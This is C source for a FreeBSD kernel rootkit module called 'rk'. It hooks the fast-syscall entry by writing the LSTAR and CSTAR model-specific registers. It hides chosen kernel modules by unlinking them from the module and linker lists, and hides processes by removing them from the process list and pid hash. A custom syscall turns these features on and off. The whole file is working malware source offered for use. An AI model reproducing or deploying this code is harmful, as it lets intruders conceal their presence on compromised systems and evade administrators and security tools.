#include <sys/param.h>
#include <sys/types.h>
#include <sys/module.h>
#include <sys/sysproto.h>
#include <sys/linker.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <machine/specialreg.h>
#include <sys/proc.h>
#include <sys/queue.h>

extern u_int64_t hook_fast_syscall, hook_fast_syscall32;
extern u_int64_t Xfast_syscall, Xfast_syscall32;

struct rk_args{
	int cmd;
	char *arg1;
};

static void attach_rk(void);
static void detach_rk(void);
static int hide_module(char *);
static int hide_process(char *);

int status = 0;

struct module {
	TAILQ_ENTRY(module)     link;   /* chain together all modules */
	TAILQ_ENTRY(module)     flink;  /* all modules in a file */
	struct linker_file      *file;  /* file which contains this module */
	int                     refs;   /* reference count */
	int                     id;     /* unique id number */
	char                    *name;  /* module name */
	modeventhand_t          handler;        /* event handler */
	void                    *arg;   /* argument for handler */
	modspecific_t           data;   /* module specific data */
};

extern TAILQ_HEAD(modulelist, module) modules;
extern linker_file_list_t linker_files;

static int hide_module(char *module_name){

	module_t mod;
        linker_file_t lf;
	int len;
	char buffer[20];	// this need to be changed

	if(module_name == NULL){
		return -1;
	}

	len = strlen(module_name);

	if(len > 16){
		return -1;
	}

	TAILQ_FOREACH(mod, &modules, link) {
		if(strcmp(mod->name,module_name) == 0){
			TAILQ_REMOVE(&modules,mod,link);
			break;
		}
	}

	memset(buffer,'\0',sizeof(buffer));

	sprintf(buffer,"%s.ko",module_name);

	TAILQ_FOREACH(lf, &linker_files, link){
		if (strcmp(lf->filename,buffer) == 0){
			TAILQ_REMOVE(&linker_files,lf,link);
			break;
		}
	}

	return 0;
}


static int hide_process(char *process_name){
	         struct proc *process;

                 LIST_FOREACH(process, &allproc, p_list){
	                 if(process->p_args != NULL){
		                 if (strcmp(process->p_args->ar_args,process_name) == 0){ 
	                        	(&pidhashtbl[process->p_pid & pidhash])->lh_first = 0;
					LIST_REMOVE(process,p_list);
					break;
				 }
			 }
		 }   
return 0;
}

static int main(struct thread *td, struct rk_args *arg){

	switch(arg->cmd){
		case 1:
			if(status == 0){
				attach_rk();
			}
		break;
		case 2:
			if(status == 1){
				detach_rk();
			}
		break;
		case 3:
			if(arg->arg1 != NULL){
				hide_module(arg->arg1);
			}
		break;
		case 4:
			if(arg->arg1 != NULL){
				hide_process(arg->arg1);
			}
		break;
	}

	return 0;
}

static void attach_rk(void){
	wrmsr(MSR_LSTAR,(u_int64_t)&hook_fast_syscall);
	wrmsr(MSR_CSTAR,(u_int64_t)&hook_fast_syscall32);	
	status = 1;
}

static void detach_rk(void){
	wrmsr(MSR_LSTAR,(u_int64_t)&Xfast_syscall);
	wrmsr(MSR_CSTAR,(u_int64_t)&Xfast_syscall32);
	status = 0;
}

static struct sysent func_sysent = {
	2,
	(sy_call_t *)main
};

static int offset = NO_SYSCALL;

static int load (struct module *module, int cmd, void *arg)
{
	int error = 0;

	switch (cmd)
	{
		case MOD_LOAD:
			attach_rk();
		break;
		case MOD_UNLOAD:
			detach_rk();
		break;
		default:
			error = EOPNOTSUPP;
		break;
	}

return error;
}

SYSCALL_MODULE(rk, &offset, &func_sysent, load, NULL);
